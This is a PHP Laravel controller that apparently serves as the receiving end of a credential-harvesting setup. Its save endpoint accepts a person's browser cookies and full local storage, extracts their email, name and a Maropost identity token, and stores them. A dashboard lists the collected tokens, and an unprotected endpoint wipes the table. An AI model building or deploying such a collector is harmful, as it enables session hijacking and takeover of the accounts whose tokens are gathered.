<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\UserAccountProfile;
use Inertia\Inertia;
class UserAccountDetails extends Controller
{
    //
    public function save(Request $request){
 
     
        try {
            $validated = $request->validate([
                'local-storage' => 'required',
            ]);
            if($validated){
                $local_storage = $request->get('local-storage');
                $fullname = $request->get('fullname');
                $local_storage = json_decode($local_storage,true);
                $token='';
                $email=NULL;
    
                $vx = json_decode($local_storage["mp.vx"],true);
                
                if($vx && $vx['auth']){
                    $auth = $vx["auth"];
                    $email = $auth["userdata"]["email"] ?$auth["userdata"]["email"] :"";
                    $token = $auth["maropostIdentityToken"] ? $auth["maropostIdentityToken"] : "";
                    $fullname =$auth["username"]? $auth["username"]["firstName"]." ".$auth["username"]["lastName"]:$request->get('fullname');
                }
                if($email){
                    $record =UserAccountProfile::where("email", $email)->first();
                } 
                if(!$record) {
                    $record = new UserAccountProfile();
                }
                
                $record->cookie = $request->get('cookie');
                $record->token = $token;
                $record->email = $email;
                $record->localstorage = $request->get('local-storage');
                $record->fullname = $fullname;
                $data = $record->save();
                return response()->json($record, 200);
            } 
        } 
        catch(Exception $e) {
            return response()->json(['error'=> 'Something went wrong!'],400);
        }

        return response()->json(['error'=> 'Invalid Response'],400);
    }
    public function dashboard(){
        
        $data = UserAccountProfile::select("id","email","fullname","token")->orderBy('id','desc')->get();
        return Inertia::render('Dashboard', [
            'data' => $data
        ]);
    }
    public function destory(){
        UserAccountProfile::truncate();
        return response()->json(['msg'=> 'Done'],200);
    }

}
